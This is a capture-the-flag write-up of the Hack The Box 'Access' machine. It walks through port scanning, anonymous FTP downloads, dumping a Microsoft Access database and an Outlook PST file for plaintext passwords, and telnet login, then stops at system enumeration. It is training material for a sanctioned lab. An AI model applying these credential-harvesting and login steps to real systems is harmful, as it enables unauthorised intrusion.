---
title: Write-up Access on HTB
author: eMVee
date: 2024-04-15 00:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, mdb, pst, runas, OSCP, PNPT]
render_with_liquid: false
---

[Access](https://www.hackthebox.com/machines/access) is a popular machine on Hack The Box (HTB), a platform for security professionals and enthusiasts to practice and improve their penetration testing skills. This machine is designed to simulate a real-world scenario, where you are tasked with exploiting vulnerabilities and gaining access to a target system. In this blog post, we will take a closer look at Access and explore some of the techniques and tools used to compromise it. Whether you are a seasoned penetration tester or just starting out, Access is a great machine to learn from and test your skills on. So, let's dive in and see what makes Access such a popular and challenging machine on HTB!

## Getting started

Before we can start we have to spawn the machine on HTB. Next we should create a project directory for the machine. And as soon as the IP address has been assigned to the machine we should copy it and assign it to a variable.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/HTB

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mkdir Access 

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ cd Access       

┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ ip=10.129.12.50

```

We are ready to start enumerating.

## Enumeration

Let's run a simple ping request to see if the machine is responding to our ping request.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ ping $ip -c 3           
PING 10.129.12.50 (10.129.12.50) 56(84) bytes of data.
64 bytes from 10.129.12.50: icmp_seq=1 ttl=127 time=7.15 ms
64 bytes from 10.129.12.50: icmp_seq=2 ttl=127 time=7.09 ms
64 bytes from 10.129.12.50: icmp_seq=3 ttl=127 time=7.55 ms

--- 10.129.12.50 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 7.088/7.263/7.554/0.206 ms
```
We can confirm that the machine is probably running on a Windows Operating System by looking at the value in the `ttl` field. Next we should start scanning for open ports and services on the target. 
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip      
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-15 11:36 CEST
Nmap scan report for 10.129.12.50
Host is up (0.0069s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 23/tcp)
HOP RTT     ADDRESS
1   6.60 ms 10.10.14.1
2   6.73 ms 10.129.12.50

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 276.26 seconds

```

- Windows probably Windows 7 or Windows 2008 server
- Port 21
	- FTP
	- Anonymous FTP login allowed
- Port 23
	- Telnet
- Port 80
	- Microsoft-IIS 7.5
	- Title: MegaCorp

It looks like the machine is running a webserver with Microsoft-IIS/7.5 Based on this information and the information from Microsoft the target is probably running on Windows 7 or Windows 2008 server. [https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis](https://learn.microsoft.com/en-us/lifecycle/products/internet-information-services-iis)
Since the nmap did discover the FTP service with anonymous usage we should try to logon and look for interesting files.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ ftp $ip -a                        
Connected to 10.129.12.50.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
425 Cannot open data connection.
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> 

```

There are two directories on the FTP server we should look closer to.

```bash
ftp> dir Backups
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> dir Engineer
200 PORT command successful.
150 Opening ASCII mode data connection.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.

```

Both files sounds interesting. Let's copy both of them to our working directory.

```bash
ftp> cd Backups
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> bin
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |**********************************************************************|  5520 KiB    5.92 MiB/s    00:00 ETA
226 Transfer complete.
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
5652480 bytes received in 00:00 (5.92 MiB/s)
ftp> cd ../Engineer
250 CWD command successful.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |**********************************************************************| 10870      477.15 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:00 (474.02 KiB/s)

```
Let's check if the files are stored locally so we can inspect them.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ ll
total 5532
-rw-r--r-- 1 emvee emvee   10870 Aug 24  2018 'Access Control.zip'
-rw-r--r-- 1 emvee emvee 5652480 Aug 23  2018  backup.mdb

```
The `mdb` file is a Microsoft Access database file that literally stands for Microsoft Database. This is the default database file format used in Access 2003 and earlier, while newer versions use the ACCDB format. To open this file we should install some additional tools.
```bash 
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ sudo apt-get update && sudo apt-get install mdbtools
[sudo] password for emvee: 

```
Since we don't know the tables of the database we can check those with the following command.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ mdb-tables backup.mdb
acc_antiback acc_door acc_firstopen acc_firstopen_emp acc_holidays acc_interlock acc_levelset acc_levelset_door_group acc_linkageio acc_map acc_mapdoorpos acc_morecardempgroup acc_morecardgroup acc_timeseg acc_wiegandfmt ACGroup acholiday ACTimeZones action_log AlarmLog areaadmin att_attreport att_waitforprocessdata attcalclog attexception AuditedExc auth_group_permissions auth_message auth_permission auth_user auth_user_groups auth_user_user_permissions base_additiondata base_appoption base_basecode base_datatranslation base_operatortemplate base_personaloption base_strresource base_strtranslation base_systemoption CHECKEXACT CHECKINOUT dbbackuplog DEPARTMENTS deptadmin DeptUsedSchs devcmds devcmds_bak django_content_type django_session EmOpLog empitemdefine EXCNOTES FaceTemp iclock_dstime iclock_oplog iclock_testdata iclock_testdata_admin_area iclock_testdata_admin_dept LeaveClass LeaveClass1 Machines NUM_RUN NUM_RUN_DEIL operatecmds personnel_area personnel_cardtype personnel_empchange personnel_leavelog ReportItem SchClass SECURITYDETAILS ServerLog SHIFT TBKEY TBSMSALLOT TBSMSINFO TEMPLATE USER_OF_RUN USER_SPEDAY UserACMachines UserACPrivilege USERINFO userinfo_attarea UsersMachines UserUpdates worktable_groupmsg worktable_instantmsg worktable_msgtype worktable_usrmsg ZKAttendanceMonthStatistics acc_levelset_emp acc_morecardset ACUnlockComb AttParam auth_group AUTHDEVICE base_option dbapp_viewmodel FingerVein devlog HOLIDAYS personnel_issuecard SystemLog USER_TEMP_SCH UserUsedSClasses acc_monitor_log OfflinePermitGroups OfflinePermitUsers OfflinePermitDoors LossCard TmpPermitGroups TmpPermitUsers TmpPermitDoors ParamSet acc_reader acc_auxiliary STD_WiegandFmt CustomReport ReportField BioTemplate FaceTempEx FingerVeinEx TEMPLATEEx 

```
We can create a `csv` file for every table in the database.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ for table in $(mdb-tables backup.mdb); do mdb-export backup.mdb "$table" > "$table".csv; done

```
Let's check if the files are created in our working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ ll
total 6056
-rw-r--r-- 1 emvee emvee     207 Apr 15 12:23  acc_antiback.csv
-rw-r--r-- 1 emvee emvee      54 Apr 15 12:23  acc_auxiliary.csv
-rw-r--r-- 1 emvee emvee     515 Apr 15 12:23  acc_door.csv
-rw-r--r-- 1 emvee emvee   10870 Aug 24  2018 'Access Control.zip'
-rw-r--r-- 1 emvee emvee     113 Apr 15 12:23  acc_firstopen.csv
-rw-r--r-- 1 emvee emvee      31 Apr 15 12:23  acc_firstopen_emp.csv
-rw-r--r-- 1 emvee emvee     178 Apr 15 12:23  acc_holidays.csv
-rw-r--r-- 1 emvee emvee     157 Apr 15 12:23  acc_interlock.csv
-rw-r--r-- 1 emvee emvee     122 Apr 15 12:23  acc_levelset.csv
-rw-r--r-- 1 emvee emvee      79 Apr 15 12:23  acc_levelset_door_group.csv
-rw-r--r-- 1 emvee emvee      30 Apr 15 12:23  acc_levelset_emp.csv
-rw-r--r-- 1 emvee emvee     254 Apr 15 12:23  acc_linkageio.csv
-rw-r--r-- 1 emvee emvee     133 Apr 15 12:23  acc_map.csv
-rw-r--r-- 1 emvee emvee     128 Apr 15 12:23  acc_mapdoorpos.csv
-rw-r--r-- 1 emvee emvee     238 Apr 15 12:23  acc_monitor_log.csv
-rw-r--r-- 1 emvee emvee     161 Apr 15 12:23  acc_morecardempgroup.csv
-rw-r--r-- 1 emvee emvee     125 Apr 15 12:23  acc_morecardgroup.csv
-rw-r--r-- 1 emvee emvee     119 Apr 15 12:23  acc_morecardset.csv
-rw-r--r-- 1 emvee emvee      46 Apr 15 12:23  acc_reader.csv
-rw-r--r-- 1 emvee emvee    2362 Apr 15 12:23  acc_timeseg.csv
-rw-r--r-- 1 emvee emvee     665 Apr 15 12:23  acc_wiegandfmt.csv
-rw-r--r-- 1 emvee emvee     128 Apr 15 12:23  ACGroup.csv
-rw-r--r-- 1 emvee emvee      47 Apr 15 12:23  acholiday.csv
-rw-r--r-- 1 emvee emvee     134 Apr 15 12:23  ACTimeZones.csv
-rw-r--r-- 1 emvee emvee    1805 Apr 15 12:23  action_log.csv
-rw-r--r-- 1 emvee emvee     140 Apr 15 12:23  ACUnlockComb.csv
-rw-r--r-- 1 emvee emvee      56 Apr 15 12:23  AlarmLog.csv
-rw-r--r-- 1 emvee emvee      46 Apr 15 12:23  areaadmin.csv
-rw-r--r-- 1 emvee emvee      48 Apr 15 12:23  att_attreport.csv
-rw-r--r-- 1 emvee emvee      49 Apr 15 12:23  attcalclog.csv
-rw-r--r-- 1 emvee emvee     270 Apr 15 12:23  attexception.csv
-rw-r--r-- 1 emvee emvee     415 Apr 15 12:23  AttParam.csv
-rw-r--r-- 1 emvee emvee     127 Apr 15 12:23  att_waitforprocessdata.csv
-rw-r--r-- 1 emvee emvee      51 Apr 15 12:23  AuditedExc.csv
-rw-r--r-- 1 emvee emvee      20 Apr 15 12:23  AUTHDEVICE.csv
-rw-r--r-- 1 emvee emvee     121 Apr 15 12:23  auth_group.csv
-rw-r--r-- 1 emvee emvee      26 Apr 15 12:23  auth_group_permissions.csv
-rw-r--r-- 1 emvee emvee      19 Apr 15 12:23  auth_message.csv
-rw-r--r-- 1 emvee emvee      33 Apr 15 12:23  auth_permission.csv
-rw-r--r-- 1 emvee emvee     210 Apr 15 12:23  auth_user.csv
-rw-r--r-- 1 emvee emvee      20 Apr 15 12:23  auth_user_groups.csv
-rw-r--r-- 1 emvee emvee      25 Apr 15 12:23  auth_user_user_permissions.csv
-rw-r--r-- 1 emvee emvee 5652480 Aug 23  2018  backup.mdb
-rw-r--r-- 1 emvee emvee      76 Apr 15 12:23  base_additiondata.csv
-rw-r--r-- 1 emvee emvee     117 Apr 15 12:23  base_appoption.csv
-rw-r--r-- 1 emvee emvee     144 Apr 15 12:23  base_basecode.csv
-rw-r--r-- 1 emvee emvee     142 Apr 15 12:23  base_datatranslation.csv
-rw-r--r-- 1 emvee emvee     259 Apr 15 12:23  base_operatortemplate.csv
-rw-r--r-- 1 emvee emvee     216 Apr 15 12:23  base_option.csv
-rw-r--r-- 1 emvee emvee     118 Apr 15 12:23  base_personaloption.csv
-rw-r--r-- 1 emvee emvee     102 Apr 15 12:23  base_strresource.csv
-rw-r--r-- 1 emvee emvee     118 Apr 15 12:23  base_strtranslation.csv
-rw-r--r-- 1 emvee emvee     110 Apr 15 12:23  base_systemoption.csv
-rw-r--r-- 1 emvee emvee     143 Apr 15 12:23  BioTemplate.csv
-rw-r--r-- 1 emvee emvee      95 Apr 15 12:23  CHECKEXACT.csv
-rw-r--r-- 1 emvee emvee      95 Apr 15 12:23  CHECKINOUT.csv
-rw-r--r-- 1 emvee emvee      19 Apr 15 12:23  CustomReport.csv
-rw-r--r-- 1 emvee emvee     122 Apr 15 12:23  dbapp_viewmodel.csv
-rw-r--r-- 1 emvee emvee     131 Apr 15 12:23  dbbackuplog.csv
-rw-r--r-- 1 emvee emvee     582 Apr 15 12:23  DEPARTMENTS.csv
-rw-r--r-- 1 emvee emvee      79 Apr 15 12:23  deptadmin.csv
-rw-r--r-- 1 emvee emvee      13 Apr 15 12:23  DeptUsedSchs.csv
-rw-r--r-- 1 emvee emvee     206 Apr 15 12:23  devcmds_bak.csv
-rw-r--r-- 1 emvee emvee     206 Apr 15 12:23  devcmds.csv
-rw-r--r-- 1 emvee emvee      35 Apr 15 12:23  devlog.csv
-rw-r--r-- 1 emvee emvee      24 Apr 15 12:23  django_content_type.csv
-rw-r--r-- 1 emvee emvee      37 Apr 15 12:23  django_session.csv
-rw-r--r-- 1 emvee emvee      78 Apr 15 12:23  EmOpLog.csv
-rw-r--r-- 1 emvee emvee      48 Apr 15 12:23  empitemdefine.csv
-rw-r--r-- 1 emvee emvee      21 Apr 15 12:23  EXCNOTES.csv
-rw-r--r-- 1 emvee emvee     104 Apr 15 12:23  FaceTemp.csv
-rw-r--r-- 1 emvee emvee     104 Apr 15 12:23  FaceTempEx.csv
-rw-r--r-- 1 emvee emvee      86 Apr 15 12:23  FingerVein.csv
-rw-r--r-- 1 emvee emvee      86 Apr 15 12:23  FingerVeinEx.csv
-rw-r--r-- 1 emvee emvee     109 Apr 15 12:23  HOLIDAYS.csv
-rw-r--r-- 1 emvee emvee     128 Apr 15 12:23  iclock_dstime.csv
-rw-r--r-- 1 emvee emvee      50 Apr 15 12:23  iclock_oplog.csv
-rw-r--r-- 1 emvee emvee      23 Apr 15 12:23  iclock_testdata_admin_area.csv
-rw-r--r-- 1 emvee emvee      29 Apr 15 12:23  iclock_testdata_admin_dept.csv
-rw-r--r-- 1 emvee emvee     110 Apr 15 12:23  iclock_testdata.csv
-rw-r--r-- 1 emvee emvee    2161 Apr 15 12:23  LeaveClass1.csv
-rw-r--r-- 1 emvee emvee     255 Apr 15 12:23  LeaveClass.csv
-rw-r--r-- 1 emvee emvee      23 Apr 15 12:23  LossCard.csv
-rw-r--r-- 1 emvee emvee    1614 Apr 15 12:23  Machines.csv
-rw-r--r-- 1 emvee emvee      50 Apr 15 12:23  NUM_RUN.csv
-rw-r--r-- 1 emvee emvee      60 Apr 15 12:23  NUM_RUN_DEIL.csv
-rw-r--r-- 1 emvee emvee      27 Apr 15 12:23  OfflinePermitDoors.csv
-rw-r--r-- 1 emvee emvee      31 Apr 15 12:23  OfflinePermitGroups.csv
-rw-r--r-- 1 emvee emvee      28 Apr 15 12:23  OfflinePermitUsers.csv
-rw-r--r-- 1 emvee emvee     211 Apr 15 12:23  operatecmds.csv
-rw-r--r-- 1 emvee emvee      21 Apr 15 12:23  ParamSet.csv
-rw-r--r-- 1 emvee emvee     157 Apr 15 12:23  personnel_area.csv
-rw-r--r-- 1 emvee emvee     120 Apr 15 12:23  personnel_cardtype.csv
-rw-r--r-- 1 emvee emvee     196 Apr 15 12:23  personnel_empchange.csv
-rw-r--r-- 1 emvee emvee     178 Apr 15 12:23  personnel_issuecard.csv
-rw-r--r-- 1 emvee emvee     199 Apr 15 12:23  personnel_leavelog.csv
-rw-r--r-- 1 emvee emvee      35 Apr 15 12:23  ReportField.csv
-rw-r--r-- 1 emvee emvee      90 Apr 15 12:23  ReportItem.csv
-rw-r--r-- 1 emvee emvee     174 Apr 15 12:23  SchClass.csv
-rw-r--r-- 1 emvee emvee     102 Apr 15 12:23  SECURITYDETAILS.csv
-rw-r--r-- 1 emvee emvee      67 Apr 15 12:23  ServerLog.csv
-rw-r--r-- 1 emvee emvee     122 Apr 15 12:23  SHIFT.csv
-rw-r--r-- 1 emvee emvee     154 Apr 15 12:23  STD_WiegandFmt.csv
-rw-r--r-- 1 emvee emvee     113 Apr 15 12:23  SystemLog.csv
-rw-r--r-- 1 emvee emvee      46 Apr 15 12:23  TBKEY.csv
-rw-r--r-- 1 emvee emvee      31 Apr 15 12:23  TBSMSALLOT.csv
-rw-r--r-- 1 emvee emvee      71 Apr 15 12:23  TBSMSINFO.csv
-rw-r--r-- 1 emvee emvee     348 Apr 15 12:23  TEMPLATE.csv
-rw-r--r-- 1 emvee emvee     348 Apr 15 12:23  TEMPLATEEx.csv
-rw-r--r-- 1 emvee emvee      27 Apr 15 12:23  TmpPermitDoors.csv
-rw-r--r-- 1 emvee emvee      31 Apr 15 12:23  TmpPermitGroups.csv
-rw-r--r-- 1 emvee emvee      76 Apr 15 12:23  TmpPermitUsers.csv
-rw-r--r-- 1 emvee emvee      16 Apr 15 12:23  UserACMachines.csv
-rw-r--r-- 1 emvee emvee      79 Apr 15 12:23  UserACPrivilege.csv
-rw-r--r-- 1 emvee emvee      23 Apr 15 12:23  userinfo_attarea.csv
-rw-r--r-- 1 emvee emvee    1879 Apr 15 12:23  USERINFO.csv
-rw-r--r-- 1 emvee emvee      61 Apr 15 12:23  USER_OF_RUN.csv
-rw-r--r-- 1 emvee emvee      19 Apr 15 12:23  UsersMachines.csv
-rw-r--r-- 1 emvee emvee      52 Apr 15 12:23  USER_SPEDAY.csv
-rw-r--r-- 1 emvee emvee      56 Apr 15 12:23  USER_TEMP_SCH.csv
-rw-r--r-- 1 emvee emvee      21 Apr 15 12:23  UserUpdates.csv
-rw-r--r-- 1 emvee emvee      13 Apr 15 12:23  UserUsedSClasses.csv
-rw-r--r-- 1 emvee emvee     114 Apr 15 12:23  worktable_groupmsg.csv
-rw-r--r-- 1 emvee emvee     131 Apr 15 12:23  worktable_instantmsg.csv
-rw-r--r-- 1 emvee emvee     157 Apr 15 12:23  worktable_msgtype.csv
-rw-r--r-- 1 emvee emvee     109 Apr 15 12:23  worktable_usrmsg.csv
-rw-r--r-- 1 emvee emvee     267 Apr 15 12:23  ZKAttendanceMonthStatistics.csv

```
We have a lot of files that we should inspect. Let's try to find a password in one of these files. We can use `grep` to search through all these files.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ grep 'pass' *
auth_user.csv:id,username,password,Status,last_login,RoleID,Remark
USERINFO.csv:USERID,Badgenumber,SSN,Gender,TITLE,PAGER,BIRTHDAY,HIREDDAY,street,CITY,STATE,ZIP,OPHONE,FPHONE,VERIFICATIONMETHOD,DEFAULTDEPTID,SECURITYFLAGS,ATT,INLATE,OUTEARLY,OVERTIME,SEP,HOLIDAY,MINZU,PASSWORD,LUNCHDURATION,PHOTO,mverifypass,Notes,privilege,InheritDeptSch,InheritDeptSchClass,AutoSchPlan,MinAutoSchInterval,RegisterOT,InheritDeptRule,EMPRIVILEGE,CardNo,change_operator,change_time,create_operator,create_time,delete_operator,delete_time,status,lastname,AccGroup,TimeZones,identitycard,UTime,Education,OffDuty,DelTag,morecard_group_id,set_valid_time,acc_startdate,acc_enddate,birthplace,Political,contry,hiretype,email,firedate,isatt,homeaddress,emptype,bankcode1,bankcode2,isblacklist,Iuser1,Iuser2,Iuser3,Iuser4,Iuser5,Cuser1,Cuser2,Cuser3,Cuser4,Cuser5,Duser1,Duser2,Duser3,Duser4,Duser5,reserve,name,OfflineBeginDate,OfflineEndDate,carNo,carType,carBrand,carColor

```

We can see the column `password` in the file `auth_user.csv`. So let's look into this file closer.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ cat auth_user.csv      
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,

```

We got three user accounts and passwords found in this database.
We should try to extract the `zip` file we have downloaded earlier from the FTP server.
![Image](/assets/img/WriteUp/HTB/Access/Pasted image 20240415123927.png){: width="700" height="400" }

The file has been extracted successfully, now we should open it.

![Image](/assets/img/WriteUp/HTB/Access/Pasted image 20240415123959.png){: width="700" height="400" }

The `pst`file has been extracted to our working directory. A PST file is a **personal storage table**, which is a file format Microsoft programs use to store items like calendar events, contacts, and email messages. PST files are stored within popular Microsoft software like Microsoft Exchange Client, Windows Messaging, and Microsoft Outlook. Before we can check the content of the file we should install some additional tools.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ sudo apt-get update && sudo apt-get install libpst-dev pst-utils -y
[sudo] password for emvee: 

```

We have installed the tools, now we should make the file readable and save the content into a seperate directory.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ mkdir mail                 
10.129.12.50
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ readpst -o mail -M Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
10.129.12.50
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ ll mail                         
total 4
drwxr-xr-x 2 emvee emvee 4096 Apr 15 13:16 'Access Control'
10.129.12.50
```
Let's read the mail.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ cat mail/Access\ Control/2 less
Status: RO
From: john@megacorp.com <john@megacorp.com>
Subject: MegaCorp Access Control System "security" account
To: 'security@accesscontrolsystems.com'
Date: Thu, 23 Aug 2018 23:44:07 +0000
MIME-Version: 1.0
Content-Type: multipart/mixed;
        boundary="--boundary-LibPST-iamunique-815800184_-_-"


----boundary-LibPST-iamunique-815800184_-_-
Content-Type: multipart/alternative;
        boundary="alt---boundary-LibPST-iamunique-815800184_-_-"

--alt---boundary-LibPST-iamunique-815800184_-_-
Content-Type: text/plain; charset="utf-8"

Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John


--alt---boundary-LibPST-iamunique-815800184_-_-
Content-Type: text/html; charset="us-ascii"

<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:w="urn:schemas-microsoft-com:office:word" xmlns:m="http://schemas.microsoft.com/office/2004/12/omml" xmlns="http://www.w3.org/TR/REC-html40"><head><meta http-equiv=Content-Type content="text/html; charset=us-ascii"><meta name=Generator content="Microsoft Word 15 (filtered medium)"><style><!--
/* Font Definitions */
@font-face
        {font-family:"Cambria Math";
        panose-1:0 0 0 0 0 0 0 0 0 0;}
@font-face
        {font-family:Calibri;
        panose-1:2 15 5 2 2 2 4 3 2 4;}
/* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
        {margin:0in;
        margin-bottom:.0001pt;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
a:link, span.MsoHyperlink
        {mso-style-priority:99;
        color:#0563C1;
        text-decoration:underline;}
a:visited, span.MsoHyperlinkFollowed
        {mso-style-priority:99;
        color:#954F72;
        text-decoration:underline;}
p.msonormal0, li.msonormal0, div.msonormal0
        {mso-style-name:msonormal;
        mso-margin-top-alt:auto;
        margin-right:0in;
        mso-margin-bottom-alt:auto;
        margin-left:0in;
        font-size:11.0pt;
        font-family:"Calibri",sans-serif;}
span.EmailStyle18
        {mso-style-type:personal-compose;
        font-family:"Calibri",sans-serif;
        color:windowtext;}
.MsoChpDefault
        {mso-style-type:export-only;
        font-size:10.0pt;
        font-family:"Calibri",sans-serif;}
@page WordSection1
        {size:8.5in 11.0in;
        margin:1.0in 1.0in 1.0in 1.0in;}
div.WordSection1
        {page:WordSection1;}
--></style><!--[if gte mso 9]><xml>
<o:shapedefaults v:ext="edit" spidmax="1026" />
</xml><![endif]--><!--[if gte mso 9]><xml>
<o:shapelayout v:ext="edit">
<o:idmap v:ext="edit" data="1" />
</o:shapelayout></xml><![endif]--></head><body lang=EN-US link="#0563C1" vlink="#954F72"><div class=WordSection1><p class=MsoNormal>Hi there,<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>The password for the &#8220;security&#8221; account has been changed to 4Cc3ssC0ntr0ller.&nbsp; Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>John<o:p></o:p></p></div></body></html>
--alt---boundary-LibPST-iamunique-815800184_-_---

----boundary-LibPST-iamunique-815800184_-_---

cat: less: No such file or directory

```

We have found another password. We can try to logon to telnet with the new password `4Cc3ssC0ntr0ller`.


## Initial access

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Access]
└─$ telnet $ip
Trying 10.129.12.50...
Connected to 10.129.12.50.
Escape character is '^]'.

Welcome to Microsoft Telnet Service 

login:security 
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>

```
Let's check the directory of this user.
```
C:\Users\security>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of C:\Users\security

08/23/2018  11:52 PM    <DIR>          .
08/23/2018  11:52 PM    <DIR>          ..
08/24/2018  08:37 PM    <DIR>          .yawcam
08/21/2018  11:35 PM    <DIR>          Contacts
08/28/2018  07:51 AM    <DIR>          Desktop
08/21/2018  11:35 PM    <DIR>          Documents
08/21/2018  11:35 PM    <DIR>          Downloads
08/21/2018  11:35 PM    <DIR>          Favorites
08/21/2018  11:35 PM    <DIR>          Links
08/21/2018  11:35 PM    <DIR>          Music
08/21/2018  11:35 PM    <DIR>          Pictures
08/21/2018  11:35 PM    <DIR>          Saved Games
08/21/2018  11:35 PM    <DIR>          Searches
08/24/2018  08:39 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   3,346,829,312 bytes free

```
On the desktop there should be the user flag. Let's get the user flag and submit it to HTB.
```

C:\Users\security>cd Desktop

C:\Users\security\Desktop>type user.txt
<HERE IS THE USER FLAG>


```

Now we should continue with enumerating the system so we can escalate our privileges in the end to gain administrative permissions on the system. Let's gather some information about the system.

```
C:\Users\security\Desktop>systeminfo

Host Name:                 ACCESS
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84191
Original Install Date:     8/21/2018, 9:43:10 PM
System Boot Time:          4/15/2024, 11:15:12 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 11/12/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     6,143 MB
Available Physical Memory: 5,437 MB
Virtual Memory: Max Size:  12,285 MB
Virtual Memory: Available: 11,574 MB
Virtual Memory: In Use:    711 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 110 Hotfix(s) Installed.
                           [01]: KB981391
                           [02]: KB981392
                           [03]: KB977236
                           [04]: KB981111
                           [05]: KB977238
                           [06]: KB977239
                           [07]: KB981390
                           [08]: KB2032276
                           [09]: KB2296011
                           [10]: KB2305420
                           [11]: KB2345886
                           [12]: KB2347290
                           [13]: KB2378111
                           [14]: KB2386667
                           [15]: KB2387149
                           [16]: KB2393802
                           [17]: KB2419640
                           [18]: KB2423089
                           [19]: KB2425227
                           [20]: KB2442962
                           [21]: KB2454826
                           [22]: KB2467023
                           [23]: KB2479943
                           [24]: KB2483614
                           [25]: KB2484033
                           [26]: KB2488113
                           [27]: KB2505438
                           [28]: KB2506014
                           [29]: KB2506212
                           [30]: KB2506928
                           [31]: KB2509553
                           [32]: KB2511250
                           [33]: KB2511455
                           [34]: KB2522422
                           [35]: KB2529073
